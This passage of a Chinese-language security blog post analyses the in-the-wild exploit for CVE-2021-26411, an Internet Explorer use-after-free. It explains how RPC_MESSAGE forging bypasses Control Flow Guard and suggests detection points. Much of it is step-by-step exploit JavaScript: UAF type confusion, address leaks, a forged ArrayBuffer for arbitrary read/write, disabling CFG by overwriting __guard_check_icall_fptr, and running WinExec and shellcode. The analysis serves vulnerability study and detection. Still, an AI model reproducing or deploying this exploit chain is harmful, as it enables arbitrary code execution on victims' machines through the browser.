call2(WinExec,[newStr('calc.exe'),5])

```

calc.exe 加载了来自 ie 的 utility dll：

![](img/b5196ac58e58f951ee93b6ba3f522a4d.png)

调用 rpc：

![](img/95c1397b0a5cc52148df08547ae15dc5.png)

![](img/6a09362749d91d80007131cbe9dc46af.png)

 对于可疑内存的修改和进程执行，可以看到如下三个 api 的调用：virutalprotect、loadlibrary 以及 winexec，因此采集 os api 应该是可以知道有可疑的内存修改和进程执行动作，尤其是 IE 里执行这些 API。

![](img/5cd2094b127e6084d6893f77bb2322d4.png)

```
// 调用 API,弹出计算器
// 通过在 kernel32.dll 模块导出表中查找 WinExec 函数的地址，然后使用其执行了命令行 calc.exe 
var kernel32 = call2(LoadLibraryExA,[newStr('kernel32.dll',0,1)])
var WinExec = getProcAddr(kernel32,'WinExec')
call2(WinExec,[newStr('calc.exe'),5])

// step5 执行 shellcode
//加载 msi.dll 模块到进程中，将 shellcode 写入距 msi.dll 基址 0x5000 的位置，设置内存属性后执行之
var shellcode = new Uint8Array([0xb8, 0x37, 0x13, 0x00, 0x00, 0xc3])
var msi = call2(LoadLibraryExA, [newStr('msi.dll'), 0, 1]) + 0x5000
var tmpBuffer = createArrayBuffer(4)
call2(VirtualProtect, [msi, shellcode.length, 0x4, tmpBuffer])
writeData(msi, shellcode) // mov eax, 0x1337 ; ret
call2(VirtualProtect, [msi, shellcode.length, read(tmpBuffer, 32), tmpBuffer])
var result = call2(msi, [])
// 根据 shellocde 的而反汇编结果，这里会弹出 0x1337 的对话框
alert(result.toString(16))

```

 好了，有了上面的分析，我们可以总结出如下核心的检测逻辑：

1、检测可疑的 dll 加载，msi.dll

2、检测 os api： 对于可疑内存的修改和进程执行，可以看到如下三个 api 的调用：virutalprotect、loadlibrary 以及 winexec，因此采集 os api 应该是可以知道有可疑的内存修改和进程执行动作，尤其是 IE 里执行这些 API。

3、检测可疑的子进程：ie 里通过 winexec 启动 xxx.exe 这种。

基本上，从上面三个就可以判断是 IE 中的漏洞利用执行恶意代码了。

前面内容可能有点跳跃，我重点梳理下漏洞的原理：

首先是 UAF 漏洞的认识

Use After Free 我们可以直接从字面上翻译它的意思：使用被释放的内存块。其实当一个内存块被释放之后重新使用有如下几种情况：

内存块被释放后，其对应的指针被设置为 NULL，再次使用时程序会崩溃 内存块被释放后，其对应的指针没有被设置为 NULL，在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序有可能可以正常运转内存块被释放后，其对应的指针没有被设置为 NULL，但是在下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能出现问题。

Dangling pointer 即指向被释放的内存的指针，通常是由于释放内存后，未将指针置为 NULL。

**UAF 原理**：对 Dangling pointer 所指向内存进行 use，如指针[解引用](https://so.csdn.net/so/search?q=%E8%A7%A3%E5%BC%95%E7%94%A8&spm=1001.2101.3001.7020)等。

**利用思路**：将 Dangling pointer 所指向的内存重新分配回来，且尽可能使该内存中的内容可控（如重新分配为字符串）

**举例**

```
typedef struct
{
int id;
char *name;
int (*func)() //函数指针，可以理解为类里面的方法
};
```

假设有上述这样的一个[结构体指针](https://so.csdn.net/so/search?q=%E7%BB%93%E6%9E%84%E4%BD%93%E6%8C%87%E9%92%88&spm=1001.2101.3001.7020)p：

![](img/c3abb84a1d04c280cc65f6b2e3cfb9ac.png)

在释放掉 p 之后，没有将 p 置 NULL，所以 p 变成 Dangling pointer，再通过重新分配，再次拿到 p 之前指向的这段[地址空间](https://so.csdn.net/so/search?q=%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4&spm=1001.2101.3001.7020)。

之后，通过 strcpy(p2,"addr")，或者其他方式，向这段地址空间写入新数据。

然后当我们通过其他函数，再次使用 p 指针，就会造成无法预料的后果，因为**此时 p 指针指向的内存包含的已经是完全不同的数据**

*   任意地址读：puts(p->name)--------------->puts(char*(addr2))

*   任意地址写：strcpy(p->name,data);------>strcpy((char *)(addr2),data)

*   控制流劫持：p->func()--------------------->call addr3

参考

[好好说话之 Use After Free_hollk’s blog-CSDN 博客](https://blog.csdn.net/qq_41202237/article/details/108797478 "好好说话之 Use After Free_hollk’s blog-CSDN 博客")

[CTF Pwn 中的 UAF 及 pwnable.kr UAF writeup - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/34102227 "CTF Pwn 中的 UAF 及 pwnable.kr UAF writeup - 知乎 (zhihu.com)")

好了，有了上面的基础，就能明白 CVE-2021-26411 漏洞原理了！总结下来就是：利用 UAF 读写内存==》在内存里构造恶意 rpc 数据，内含 rpc call back 函数指针（这个就是恶意代码！shellcode 在里面）==》修改 dom 的虚表函数，替换自己想要执行的 rpc 函数==》构造 dom 元素，让 js 去执行 rpc==》rpc 执行，回调 callback，执行恶意代码如下内容摘自：https://blog.csdn.net/further_eye/article/details/116263347，补充了自己的一些理解

浏览器渲染进程漏洞利用的一般思路是：在利用漏洞获得用户态任意地址读写权限后，通过篡改 DOM、js 等对象的虚表函数指针劫持程序执行流，通过 ROP 链调用 VirtualProtect 等 Win32 API，修改保存 shellcode buffer 的内存属性为 PAGE_EXECUTE_READWRITE，最终由 ROP 链跳转到 shellcode 执行（核心原理就是这个了，无非是利用了 rpc 绕过 cfg）。Windows 8.1 后，Microsoft 引入了 CFG（Control Flow Guard）缓解技术[1]，对间接调用的函数指针进行验证，从而缓解了通过篡改虚表函数指针劫持程序执行流这种利用技术。

然而对抗不会因此终止，随后出现了一些绕过 CFG 缓解技术的新方法，比如 chakra/jscript9 中通过篡改栈上函数返回地址劫持程序执行流[2]，v8 中利用具有可执行内存属性的 WebAssembly 对象执行 shellcode[3]等。 2020 年 12 月，Microsoft 在 Windows 10 20H1 中基于 Intel Tiger Lake CPU 加入了 CET 缓解技术[4]，防护了通过篡改栈上函数返回地址劫持程序执行流的利用方法。因此，如何在有 CET 防护的环境中绕过 CFG 再次成为漏洞利用的难题。

在分析 CVE-2021-26411 在野利用样本时[5]，我们发现了一种利用 Windows [RPC](https://so.csdn.net/so/search?q=RPC&spm=1001.2101.3001.7020)（Remote Procedure Call）[5] 绕过 CFG 的新方法，这种方法无需依赖 ROP 链，通过构造 RPC_MESSAGE 并调用 rpcrt4!NdrServerCall2 即可实现任意代码执行。==》bypass CFG： bypass 的方法是将 RPCRT4!__guard_check_icall_fptr 中保存的负责进行 CFG Check 的函数指针由 ntdll!LdrpValidateUserCallTarget 替换为 ntdll!KiFastSystemCallRet，也是采用了替换函数指针的方法。

# ****1.********CVE********-2021-26411********回顾****

《IE 浏览器在野 0day：CVE-2021-26411 分析》[5] 一文中介绍了该漏洞的根因（就是 UAF 了）：removeAttributeNode()触发属性对象 nodeValue 的 valueOf 回调，回调期间手动调用 clearAttributes()，导致 nodeValue 保存的 BSTR 被提前释放。回调返回后，没有检查 nodeValue 是否存在继续使用该对象，最终导致 UAF。

3 月份 Windows 补丁中该漏洞的修复方法为，在 CAttrArray::Destroy 函数中删除对象操作前增加索引检查：

![](img/dc2205f183b931e73585074e3d3fc4c2.png)

对应我实验里的代码部分为：

```
// step 1
// 利用 CVE-2021-26411 的 UAF 造成类型混淆  
var god
// 对象数组
var arr = [{}]
var fake = new ArrayBuffer(0x100)
var abf = new ArrayBuffer(0x20010)
var alloc = alloc2()
// 创建一个 HTML 属性对象
var hd0 = document.createAttribute('handle')
var hd1 = document.createAttribute('handle')
var hd2
// 创建一个 HTML 元素对象
var ele = document.createElement('element')
var att = document.createAttribute('attribute')
att.nodeValue = {
    valueOf: function() {
        hd1.nodeValue = (new alloc1()).nodeValue
        // 回调时，清除 ele 对象绑定的所有属性
        ele.clearAttributes()
        hd2 = hd1.cloneNode()
        ele.setAttribute('attribute', 1337)
    }
}
ele.setAttributeNode(att)
ele.setAttribute('attr', '0'.repeat((0x20010 - 6) / 2))
// 触发 valueof 函数回调
ele.removeAttributeNode(att)
hd0.nodeValue = alloc
// hd0.nodeValue = alloc 结束后 attr2.nodeValue 将被 hd0.nodeValue 重新占用并且与 hd2.nodeValue 形成类型混淆
// hd0.nodeValue 类型值为 0xc safeArray。
// hd2.nodeValue 类型值为 0x8 BSTR。

```

对于这样一个大小可控的 UAF 漏洞，利用思路为：利用两个不同类型的指针（BSTR 和 Dictionary.items）指向该空洞内存，通过类型混淆实现指针泄露和指针解引用（就是说利用 uaf 进行信息泄露，这里泄露的不过是地址！！！因为后面会向这些地址写入数据）：

![](img/c4aa543a8024f9e7b550f5a956039c5a.png)

 对应我实验里的泄露数据部分的代码为：

```
// step2 泄露对象元数据，伪造 ArrayBuffer
// dump 函数以 hd2.nodeValue 为参数，使用 string 对象方法 charCodeAt 获取 hd2.nodeValue(0874035c) 处的数据，然后再以 uint32 视图泄露 fake 对象和 arr 对象的地址
var leak = new Uint32Array(dump(hd2.nodeValue))
var pAbf = leak[6]
var pArr = leak[10]
var VT_I4 = 0x3
var VT_DISPATCH = 0x9
var VT_BYREF = 0x4000
var bufArr = new Array(0x10)
var fakeArr = new Uint32Array(fake)
for (var i = 0; i < 0x10; ++i) setData(i + 1, new Data(VT_BYREF | VT_I4, pAbf + i * 4))
flush()
var ref = new VBArray(hd0.nodeValue)
for (var i = 0; i < 0x10; ++i) bufArr[i] = ref.getItem(i + 1)
ref = null

```

下面章节直接跳转到了 rpc 的利用，实际上还是有一些过程的，我补充下：

泄露了地址以后，肯定是写入数据，如下

```
// setData 函数将 fake 对象的元数据的地址填充到 abf ArrayBuffer 中
setData(1, new Data(VT_BYREF | VT_I4, bufArr[4]))
setData(2, new Data(VT_BYREF | VT_I4, bufArr[4] + 0x04))
setData(3, new Data(VT_BYREF | VT_I4, bufArr[4] + 0x1c))
flush()
ref = new VBArray(hd0.nodeValue)
var vt = ref.getItem(1)
var gc = ref.getItem(2)
var bs = ref.getItem(3)
ref = null

// 使用泄露的 fake 对象的元数据在 fake.ArrayBuffer.buffer 中伪造对象，伪造的对象是一个起始地址为 0，大小为 0xffffffff 的 ArrayBuffer
for (var i = 0; i < 16; ++i) fakeArr[i] = bufArr[i]
fakeArr[4] = bs + 0x40
fakeArr[16] = vt
fakeArr[17] = gc
fakeArr[24] = 0xffffffff

// step3 实现任意读写
// 使用伪造的 ArrayBuffer 对象实现任意读写对象 god。
// 以 god 对象实现任意读
setData(1, new Data(VT_DISPATCH, bs))
flush()
ref = new VBArray(hd0.nodeValue)
god = new DataView(ref.getItem(1))
ref = null
// 任意对象地址泄露,addrOf 将对象地址存储在 arr[0]，然后读取值
pArr = read(read(pArr + 0x10, 32) + 0x14, 32) + 0x10
// 以 god 对象实现任意写 
write(read(addrOf(hd0) + 0x18, 32) + 0x28, 0, 32)

```

 最终是以 god 对象实现任意写。

# ****2********.********RPC 原理********及利用方法****

Windows RPC 用来解决分布式客户端/服务端函数调用问题。基于 RPC，客户端可以像调用本地函数一样调用服务端函数，RPC 基本架构如下图：

![](img/355a1cdb1f4c4392ac18de3a1c187dc2.png)

客户端/服务端程序将调用参数/返回值等传给下层 Stub 函数，Stub 函数负责封装数据成 NDR（Network Data Representation）格式，最后通过 rpcrt4.dll 提供的 runtime 库进行通信。

下面给出一示例 idl：

![](img/88b97e0a57f440320c085a07b6e0e352.png)

当客户端调用 add 函数后，服务端由 rpcrt4.dll 接受处理请求并调用 rpcrt4!NdrServerCall2：

![](img/d47db1bfbc73d2fc6db334f9e6b52a23.png)

rpcrt4!NdrServerCall2 只有一个参数 PRPC_MESSAGE，其中包含了客户端调用的函数索引、传参等重要数据，服务端 RPC_MESSAGE 结构及主要子数据结构如下图（32 位）：

![](img/5e3ab42c9168f0e9771dfae9ffe0b898.png)

如上图所示，RPC_MESSAGE 结构中，函数调用关键的两个变量为 Buffer 和 RpcInterfaceInformation。其中 Buffer 存放了函数的传参，RpcInterfaceInformation 指向 RPC_SERVER_INTERFACE 结构。RPC_SERVER_INTERFACE 结构保存了服务端程序接口信息，其中+0x2c DispatchTable 保存了 runtime 库和 Stub 函数的接口函数指针，+0x3c InterpreterInfo 指向 MIDL_SERVER_INFO 结构。MIDL_SERVER_INFO 结构保存了服务端 IDL 接口信息，其中 DispatchTable 保存了服务端提供的远程调用例程的函数指针数组。

下面以一个实例介绍 RPC_MESSAGE 的结构：

根据上面给出的 idl，当客户端调用 add(0x111, 0x222)，服务端程序断在 rpcrt4!NdrServerCall2：

![](img/cb458faad2a05ff6218b2c0eb6dc1b37.png)

可以看到，动态调试的内存 dump 与 RPC_MESSAGE 结构分析一致，其中 add 函数就存放在 MIDL_SERVER_INFO. DispatchTable 中。

接下来分析 rpcrt4!NdrServerCall2 是如何根据 RPC_MESSAGE 调用 add 函数的：

rpcrt4!NdrServerCall2 内部调用 rpcrt4!NdrStubCall2，rpcrt4!NdrStubCall2 内部根据 MIDL_SERVER_INFO. DispatchTable 的基地址和 RPC_MESSAGE. ProcNum 计算调用的函数指针地址，将函数指针、函数参数和参数长度传给 rpcrt4!Invoke：

![](img/71c645d7724210682b2425c6fb3693f5.png)

rpcrt4!Invoke 内部最终调用服务端例程函数：

![](img/349499f248bc30eb5194e2572b974ae1.png)

通过上面的分析可以知道，在获得任意地址读写权限后，可以构造一个 RPC_MESSAGE 数据结构，传入想要调用的函数指针（这个就是恶意代码！）和函数参数，最后手动调用 rpcrt4!NdrServerCall2，即可实现任意函数执行。

接下来需要解决两个问题：

1）如何通过 js 脚本调用 rpcrt4! NdrServerCall2

2）观察 rpcrt4!Invoke 最后的服务端例程函数调用：

![](img/2daf2b212caa7858d2fd0b6062a81351.png)

可以看到这里是一处间接调用，且有 CFG 检查。因此需要考虑替换 MIDL_SERVER_INFO. DispatchTable 函数指针后如何绕过这里的 CFG 防护。

首先解决问题 1: 如何通过 js 脚本调用 rpcrt4! NdrServerCall2

这里可以复用替换 DOM 对象虚表函数指针劫持程序执行流的方法，因为 rpcrt4!NdrServerCall2 是记录在 CFGBitmap 里的合法指针，所以替换后依然可以通过 CFG 检查。样本里通过篡改 MSHTML!CAttribute::normalize，最终由“xyz.normalize()”调用 rpcrt4!NdrServerCall2。

接着解决问题 2: 如何绕过 rpcrt4!NdrServerCall2 中的 CFG 防护

样本里的思路是:

1) 利用伪造的 RPC_MESSAGE 和 rpcrt4!NdrServerCall2 调用 VirtualProtect 修改 RPCRT4!__guard_check_icall_fptr 内存属性为 PAGE_EXECUTE_READWRITE

2)替换 rpcrt4!__guard_check_icall_fptr 里保存的指针 ntdll!LdrpValidateUserCallTarget 为 ntdll!KiFastSystemCallRet，从而关闭 rpcrt4 的 CFG 检查

3) 恢复 RPCRT4!__guard_check_icall_fptr 内存属性

解决了问题 1，2 后，后续即可利用伪造的 RPC_MESSAGE 实现任意函数的调用。样本中将 shellcode 写入 msi.dll + 0x5000 的位置，最终通过 rpcrt4!NdrServerCall2 调用 shellcode:

![](img/64d70fab0e8f713f97fbf0402b60bb34.png)

最终完整的利用演示：

![](img/373df2f47a0198569c9628a606813ac5.png)

对应我上面实验的代码就是：

```
// step4 伪造 RPC_MESSAGE 
// 伪造 RPC_MESSAGE 之前需要先调用 rpcrt4!I_RpcTransServerNewConnection 以获得 OSF_SCALL_Vftable，OSF_SCALL_Vftable 最终将被设置到 RPC_MESSAGE->Handle 中
// 而 I_RpcTransServerNewConnection 和后续 rpcrt4!NdrServerCall2 的调用都是通过伪造 Attribute 进行的
var map = new Map()
var jscript9 = getBase(read(addrOf(map), 32))
var rpcrt4 = getDllBase(jscript9, 'rpcrt4.dll')
var msvcrt = getDllBase(jscript9, 'msvcrt.dll')
var ntdll = getDllBase(msvcrt, 'ntdll.dll')
var kernelbase = getDllBase(msvcrt, 'kernelbase.dll')
var VirtualProtect = getProcAddr(kernelbase, 'VirtualProtect')
var LoadLibraryExA = getProcAddr(kernelbase, 'LoadLibraryExA')

// 创建 xyz 作为伪造 Attribute 的目标对象
// 这里伪造的 Attribute 与原 Attribute 只有虚表指针不同
var xyz = document.createAttribute('xyz')
var paoi = addrOf(xyz)
var patt = read(addrOf(xyz) + 0x18, 32)
var osf_vft = aos()

// initRpc() 的内容用一张图说明其构建的 RPC_MESSAGE 主要结构，其中 RPC_MESSAGE 也是伪造的 Attribute，其虚表的 0x28c 处是 xyz.normalize() 执行的 NdrServerCall2 函数的地址 
// 伪造 RPC_MESSAGE 作为 rpcrt4!NdrServerCall2 参数使用 
var msg = initRpc()
var rpcFree = rpcFree()

// step4 bypass CFG 
// bypass 的方法是将 RPCRT4!__guard_check_icall_fptr 中保存的负责进行 CFG Check 的函数指针由 ntdll!LdrpValidateUserCallTarget 替换为 ntdll!KiFastSystemCallRet
killCfg(rpcrt4)

```

```
// 调用 API,弹出计算器
// 通过在 kernel32.dll 模块导出表中查找 WinExec 函数的地址，然后使用其执行了命令行。
var kernel32 = call2(LoadLibraryExA,[newStr('kernel32.dll',0,1)])
var WinExec = getProcAddr(kernel32,'WinExec')
call2(WinExec,[newStr('calc.exe'),5])

// step5 执行 shellcode
//加载 msi.dll 模块到进程中，将 shellcode 写入距 msi.dll 基址 0x5000 的位置，设置内存属性后执行之
var shellcode = new Uint8Array([0xb8, 0x37, 0x13, 0x00, 0x00, 0xc3])
var msi = call2(LoadLibraryExA, [newStr('msi.dll'), 0, 1]) + 0x5000
var tmpBuffer = createArrayBuffer(4)
call2(VirtualProtect, [msi, shellcode.length, 0x4, tmpBuffer])
writeData(msi, shellcode) // mov eax, 0x1337 ; ret
call2(VirtualProtect, [msi, shellcode.length, read(tmpBuffer, 32), tmpBuffer])
var result = call2(msi, [])
// 根据 shellocde 的而反汇编结果，这里会弹出 0x1337 的对话框
alert(result.toString(16))

```

其中，通过 normalize 间接去调用 rpcrt4!NdrServerCall2 的代码：

```
// 使用目的函数地址替换假虚表中 normalize 函数的地址，这样调用 xyz.normalize() 函数便可以执行目的函数，normalize 函数地址对比 
// 达到调用 rpcrt4!NdrServerCall2 目的
// 调用方式是先将 xyz 的 Attribute 指针修改为伪造 Attribute 的地址，然后调用 xyz.normalize()，调用完再恢复 xyz 的 Attribute 指针
function call(addr) {
    var result = 0
    write(paoi + 0x18, addr, 32)
    // 错误处理
    try {
        // rpcrt4!NdrServerCall2
        xyz.normalize()
    } catch (error) {
        result = error.number
    }
    write(paoi + 0x18, patt, 32)
    return result
}

```

修改 cfg 的细节补充下，内含修改内存属性，覆盖 cfg 检查的函数：

```
function killCfg(addr) {
    var cfgobj = new CFGObject(addr)
    if (!cfgobj.getCFGValue()) return
    var guard_check_icall_fptr_address = cfgobj.getCFGAddress()
    var KiFastSystemCallRet = getProcAddr(ntdll, 'KiFastSystemCallRet')
    var tmpBuffer = createArrayBuffer(4)
    // 修改 RPCRT4!__guard_check_icall_fptr 的属性为 PAGE_EXECUTE_READWRITE
    call2(VirtualProtect, [guard_check_icall_fptr_address, 0x1000, 0x40, tmpBuffer])
    // 替换 rpcrt4!__guard_check_icall_fptr 保存的指针，修改 ntdll!LdrpValidateUserCallTarget 为改为 ntdll!KiFastSystemCallRet
    // 关闭 rpcrt4 的 CFG 检查
    write(guard_check_icall_fptr_address, KiFastSystemCallRet, 32)
    // 恢复 PRCRT4!__gurad_check_icall_fptr 内存属性
    call2(VirtualProtect, [guard_check_icall_fptr_address, 0x1000, read(tmpBuffer, 32), tmpBuffer])
    map.delete(tmpBuffer)
}

```

再度总结下核心流程

利用 UAF 读写内存==》在内存里构造恶意 rpc 数据，内含 rpc call back 函数指针（这个就是恶意代码！shellcode 在里面）==》修改 dom 的虚表函数，替换自己想要执行的 rpc 函数==》构造 dom 元素，让 js 去执行 rpc==》rpc 执行，回调 callback，执行恶意代码

# ****3********.********一些思考****

CVE-2021-26411 在野样本中出现了利用 RPC 绕过 CFG 缓解技术的这一创新方法。这种利用方法无需构造 ROP 链，直接通过伪造 RPC_MESSAGE 即可实现任意代码执行，利用简单且稳定，有理由相信该方法会成为绕过 CFG 缓解措施的一种新的有效利用技术。

# ****4********.********参考文献****

[1] https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard

[2] https://zhuanlan.kanxue.com/article-14133.htm

[3] https://www.anquanke.com/post/id/201951

[4] https://windows-internals.com/cet-on-windows/

[5] https://mp.weixin.qq.com/s?__biz=MzI4NjE2NjgxMQ==&mid=2650250070&idx=1&sn=5906feea0cfe498bffbb961e73f5c285

[6] https://docs.microsoft.com/en-us/windows/win32/rpc/rpc-start-page